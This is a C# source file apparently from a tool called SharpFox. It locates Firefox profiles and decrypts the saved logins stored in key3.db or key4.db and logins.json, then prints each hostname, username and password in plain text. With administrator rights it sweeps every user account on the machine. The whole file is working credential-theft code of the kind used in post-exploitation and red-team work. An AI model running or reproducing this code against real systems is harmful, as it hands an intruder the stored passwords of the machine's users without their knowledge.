using System;
using System.Data;
using System.Data.SQLite;
using System.Text;
using SharpFox.Cryptography;
using System.Text.RegularExpressions;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Security.Cryptography;
using SharpFox.Models;
using System.Collections.Generic;
using CS_SQLite3;
using System.Linq;

namespace SharpFox
{
    public class FireFox
    {

        private static String Parse4Logins(string directory, string userName, string masterPassword = "")
        {
            Asn1Der asn = new Asn1Der();

            byte[] item2 = new byte[] { };
            byte[] item1 = new byte[] { };
            byte[] a11 = new byte[] { };
            byte[] a102 = new byte[] { };
            string query = "SELECT item1,item2 FROM metadata WHERE id = 'password'";

            GetItemsFromQuery(directory, ref item1, ref item2, query);
            Console.WriteLine("Fetch data from key4.db file");

            Asn1DerObject f800001 = asn.Parse(item2);
            MozillaPBE CheckPwd = new MozillaPBE(item1, Encoding.ASCII.GetBytes(""), f800001.objects[0].objects[0].objects[1].objects[0].Data);
            CheckPwd.Compute();

            string decryptedPwdChk = TripleDESHelper.DESCBCDecryptor(CheckPwd.Key, CheckPwd.IV, f800001.objects[0].objects[1].Data);

            if (!decryptedPwdChk.StartsWith("password-check"))
            {
                Console.WriteLine("Master password is wrong !");
                return null;
            }

            query = "SELECT a11,a102 FROM nssPrivate";
            GetItemsFromQuery(directory, ref a11, ref a102, query);
            var decodedA11 = asn.Parse(a11);
            var entrySalt = decodedA11.objects[0].objects[0].objects[1].objects[0].Data;
            var cipherT = decodedA11.objects[0].objects[1].Data;
            byte[] privateKey;

            try
            {
                privateKey = decrypt3DES(item1, masterPassword, entrySalt, cipherT);
            }
            catch
            {
                Console.WriteLine("[X] Could not retrieve private key.");
                return null;
            }

            // decrypt username and password
            string loginsJsonPath = String.Format("{0}\\{1}", directory, "logins.json");
            Login[] logins = null;
            try
            {
                logins = ParseLoginFile(loginsJsonPath);
            }
            catch { }

            if (logins.Length == 0)
            {
                Console.WriteLine("No logins discovered from logins.json");
                return null;
            }

            foreach (Login login in logins)
            {
                Asn1DerObject user = asn.Parse(Convert.FromBase64String(login.encryptedUsername));
                Asn1DerObject pwd = asn.Parse(Convert.FromBase64String(login.encryptedPassword));

                string hostname = login.hostname;
                string decryptedUser = TripleDESHelper.DESCBCDecryptor(privateKey, user.objects[0].objects[1].objects[1].Data, user.objects[0].objects[2].Data);
                string decryptedPwd = TripleDESHelper.DESCBCDecryptor(privateKey, pwd.objects[0].objects[1].objects[1].Data, pwd.objects[0].objects[2].Data);

                Console.WriteLine("--- FireFox Credential (User: {0}) ---", userName);
                Console.WriteLine("Hostname: {0}", hostname);
                Console.WriteLine("Username: {0}", Regex.Replace(decryptedUser, @"[^\u0020-\u007F]", ""));
                Console.WriteLine("Password: {0}", Regex.Replace(decryptedPwd, @"[^\u0020-\u007F]", ""));
                Console.WriteLine();
            }
        
            return null;
        }

        private static byte[] decrypt3DES(byte[] globalSalt, string masterPwd, byte[] entrySalt, byte[] cipherT)
        {
            try
            {
                var sha1 = SHA1.Create("sha1");
                var hp = sha1.ComputeHash(globalSalt);
                Array.Resize(ref hp, 40);
                Array.Copy(entrySalt, 0, hp, 20, 20);

                var pes = entrySalt.Concat(Enumerable.Range(1, 20 - entrySalt.Length).Select(b => (byte)0).ToArray()).ToArray();
                Array.Resize(ref pes, 40);
                Array.Copy(entrySalt, 0, pes, 20, 20);
                var chp = sha1.ComputeHash(hp);
                var hmac = HMACSHA1.Create();
                hmac.Key = chp;
                var k1 = hmac.ComputeHash(pes);
                Array.Resize(ref pes, 20);

                var tk = hmac.ComputeHash(pes);
                Array.Resize(ref tk, 40);
                Array.Copy(entrySalt, 0, tk, 20, 20);
                var k2 = hmac.ComputeHash(tk);
                Array.Resize(ref k1, 40);
                Array.Copy(k2, 0, k1, 20, 20);
                var iv = k1.Skip(k1.Length - 8).ToArray();
                var key = k1.Take(24).ToArray();
                return TripleDESHelper.DESCBCDecryptorByte(key, iv, cipherT).Take(24).ToArray();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exeption:\n" + ex.Message);
                return null;
            }
        }

        private static void GetItemsFromQuery(string dir, ref byte[] item1, ref byte[] item2, string query)
        {
            DataTable dt = new DataTable();

            var db_way = dir + "\\key4.db";
            var ConnectionString = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
            var sql = string.Format(query);
            using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
            {
                connect.Open();
                using (SQLiteCommand command = new SQLiteCommand(sql, connect))
                {
                    SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                    adapter.Fill(dt);

                    int rows = dt.Rows.Count;
                    for (int i = 0; i < rows; i++)
                    {
                        Array.Resize(ref item2, ((byte[])dt.Rows[i][1]).Length);
                        Array.Copy((byte[])dt.Rows[i][1], item2, ((byte[])dt.Rows[i][1]).Length);
                        Array.Resize(ref item1, ((byte[])dt.Rows[i][0]).Length);
                        Array.Copy((byte[])dt.Rows[i][0], item1, ((byte[])dt.Rows[i][0]).Length);
                    }
                    adapter.Dispose();
                    connect.Close();
                }

            }
        }

        private static void Parse3Logins(string directory, string userName, string masterPassword = "")
        {
            // Read berkeleydb
            Asn1Der asn = new Asn1Der();

            BerkeleyDB db = new BerkeleyDB(Path.Combine(directory, "key3.db"));
            PasswordCheck pwdCheck = new PasswordCheck(db.GetValueOfKey("password-check").Replace("-", ""));
            //string GlobalSalt = (from p in db.Keys
            //                     where p.Key.Equals("global-salt")
            //                     select p.Value).FirstOrDefault().Replace("-", "");
            string GlobalSalt = db.GetValueOfKey("global-salt").Replace("-", "");

            MozillaPBE CheckPwd = new MozillaPBE(ByteHelper.ConvertHexStringToByteArray(GlobalSalt), Encoding.ASCII.GetBytes(masterPassword), ByteHelper.ConvertHexStringToByteArray(pwdCheck.EntrySalt));
            CheckPwd.Compute();
            string decryptedPwdChk = TripleDESHelper.DESCBCDecryptor(CheckPwd.Key, CheckPwd.IV, ByteHelper.ConvertHexStringToByteArray(pwdCheck.Passwordcheck));

            if (!decryptedPwdChk.StartsWith("password-check"))
            {
                Console.WriteLine("Master password is wrong; cannot decrypt FireFox logins.");
                return;
            }

            // Get private key
            string f81 = String.Empty;
            String[] blacklist = { "global-salt", "Version", "password-check" };
            foreach (var k in db.Keys)
            {
                if (Array.IndexOf(blacklist, k.Key) == -1)
                {
                    f81 = k.Value.Replace("-", "");
                }
            }
            if (f81 == String.Empty)
            {
                Console.WriteLine("[X] Could not retrieve private key.");
                return;
            }

            Asn1DerObject f800001 = asn.Parse(ByteHelper.ConvertHexStringToByteArray(f81));


            MozillaPBE CheckPrivateKey = new MozillaPBE(ByteHelper.ConvertHexStringToByteArray(GlobalSalt), Encoding.ASCII.GetBytes(masterPassword), f800001.objects[0].objects[0].objects[1].objects[0].Data);
            CheckPrivateKey.Compute();

            byte[] decryptF800001 = TripleDESHelper.DESCBCDecryptorByte(CheckPrivateKey.Key, CheckPrivateKey.IV, f800001.objects[0].objects[1].Data);

            Asn1DerObject f800001deriv1 = asn.Parse(decryptF800001);
            Asn1DerObject f800001deriv2 = asn.Parse(f800001deriv1.objects[0].objects[2].Data);

            byte[] privateKey = new byte[24];

            if (f800001deriv2.objects[0].objects[3].Data.Length > 24)
            {
                Array.Copy(f800001deriv2.objects[0].objects[3].Data, f800001deriv2.objects[0].objects[3].Data.Length - 24, privateKey, 0, 24);
            }
            else
            {
                privateKey = f800001deriv2.objects[0].objects[3].Data;
            }

            // decrypt username and password
            string loginsJsonPath = String.Format("{0}\\{1}", directory, "logins.json");
            Login[] logins = ParseLoginFile(loginsJsonPath);
            if (logins.Length == 0)
            {
                Console.WriteLine("No logins discovered from logins.json");
                return;
            }

            foreach (Login login in logins)
            {
                Asn1DerObject user = asn.Parse(Convert.FromBase64String(login.encryptedUsername));
                Asn1DerObject pwd = asn.Parse(Convert.FromBase64String(login.encryptedPassword));

                string hostname = login.hostname;
                string decryptedUser = TripleDESHelper.DESCBCDecryptor(privateKey, user.objects[0].objects[1].objects[1].Data, user.objects[0].objects[2].Data);
                string decryptedPwd = TripleDESHelper.DESCBCDecryptor(privateKey, pwd.objects[0].objects[1].objects[1].Data, pwd.objects[0].objects[2].Data);

                Console.WriteLine("--- FireFox Credential (User: {0}) ---", userName);
                Console.WriteLine("Hostname: {0}", hostname);
                Console.WriteLine("Username: {0}", Regex.Replace(decryptedUser, @"[^\u0020-\u007F]", ""));
                Console.WriteLine("Password: {0}", Regex.Replace(decryptedPwd, @"[^\u0020-\u007F]", ""));
                Console.WriteLine();
            }
        }

        public static void GetLogins(string MasterPwd = "")
        {
            // Seatbelt path checking
            List<string> validFireFoxDirectories = new List<string>();
            try
            {
                if (IsHighIntegrity())
                {
                    Console.WriteLine("\r\n\r\n=== Checking for Firefox (All Users) ===\r\n");

                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                    string[] dirs = Directory.GetDirectories(userFolder);
                    foreach (string dir in dirs)
                    {
                        string[] parts = dir.Split('\\');
                        string userName = parts[parts.Length - 1];
                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                        {
                            string userFirefoxBasePath = String.Format("{0}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\", dir);
                            if (System.IO.Directory.Exists(userFirefoxBasePath))
                            {
                                string[] directories = Directory.GetDirectories(userFirefoxBasePath);
                                foreach (string directory in directories)
                                {
                                    string firefox4KeyFile = String.Format("{0}\\{1}", directory, "key4.db");
                                    if (File.Exists(firefox4KeyFile) && File.Exists(String.Format("{0}\\{1}", directory, "logins.json")))
                                    {
                                        Parse4Logins(directory, userName, MasterPwd);
                                    }
                                    else
                                    {
                                        string firefox3KeyFile = String.Format("{0}\\{1}", directory, "key3.db");
                                        if (File.Exists(firefox3KeyFile) && File.Exists(String.Format("{0}\\{1}", directory, "logins.json")))
                                        {
                                            Parse3Logins(directory, userName, MasterPwd);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine("\r\n\r\n=== Checking for Firefox (Current User) ===\r\n");
                    string userName = Environment.GetEnvironmentVariable("USERNAME");
                    string userFirefoxBasePath = String.Format("{0}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));

                    if (System.IO.Directory.Exists(userFirefoxBasePath))
                    {
                        string[] directories = Directory.GetDirectories(userFirefoxBasePath);
                        foreach (string directory in directories)
                        {
                            string firefox4KeyFile = String.Format("{0}\\{1}", directory, "key4.db");
                            if (File.Exists(firefox4KeyFile) && File.Exists(String.Format("{0}\\{1}", directory, "logins.json")))
                            {
                                Parse4Logins(directory, userName, MasterPwd);
                            }
                            else
                            {
                                string firefox3KeyFile = String.Format("{0}\\{1}", directory, "key3.db");
                                if (File.Exists(firefox3KeyFile) && File.Exists(String.Format("{0}\\{1}", directory, "logins.json")))
                                {
                                    Parse3Logins(directory, userName, MasterPwd);
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            };
        }

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static Login[] ParseLoginFile(string path)
        {
            string rawText = File.ReadAllText(path);
            int openBracketIndex = rawText.IndexOf("[{");
            int closeBracketIndex = rawText.IndexOf("}]");
            string loginArrayText = rawText.Substring(openBracketIndex + 1, closeBracketIndex - (openBracketIndex + 1));
            return ParseLoginItems(loginArrayText);
        }

        public static Login[] ParseLoginItems(string loginJSON)
        {
            int openBracketIndex = loginJSON.IndexOf('{');
            List<Login> logins = new List<Login>();
            string[] intParams = new string[] { "id", "encType", "timesUsed" };
            string[] longParams = new string[] { "timeCreated", "timeLastUsed", "timePasswordChanged" };
            try
            {

                while (openBracketIndex != -1)
                {
                    int encTypeIndex = loginJSON.IndexOf("encType", openBracketIndex);
                    int closeBracketIndex = loginJSON.IndexOf('}', encTypeIndex);
                    Login login = new Login();
                    string bracketContent = "";
                    for (int i = openBracketIndex + 1; i < closeBracketIndex; i++)
                    {
                        bracketContent += loginJSON[i];
                    }
                    bracketContent = bracketContent.Replace("\"", "");
                    string[] keyValuePairs = bracketContent.Split(',');
                    foreach (string keyValueStr in keyValuePairs)
                    {
                        string[] keyValue = keyValueStr.Split(new Char[] { ':' }, 2);
                        string key = keyValue[0];
                        string val = keyValue[1];
                        if (val == "null")
                        {
                            login.GetType().GetProperty(key).SetValue(login, null, null);
                        }
                        if (Array.IndexOf(intParams, key) > -1)
                        {
                            login.GetType().GetProperty(key).SetValue(login, int.Parse(val), null);
                        }
                        else if (Array.IndexOf(longParams, key) > -1)
                        {
                            login.GetType().GetProperty(key).SetValue(login, long.Parse(val), null);
                        }
                        else
                        {
                            login.GetType().GetProperty(key).SetValue(login, val, null);
                        }
                    }
                    logins.Add(login);
                    openBracketIndex = loginJSON.IndexOf('{', closeBracketIndex);
                }
                return logins.ToArray();
            }
            catch
            {
                return logins.ToArray();
            }
        }
    }
}
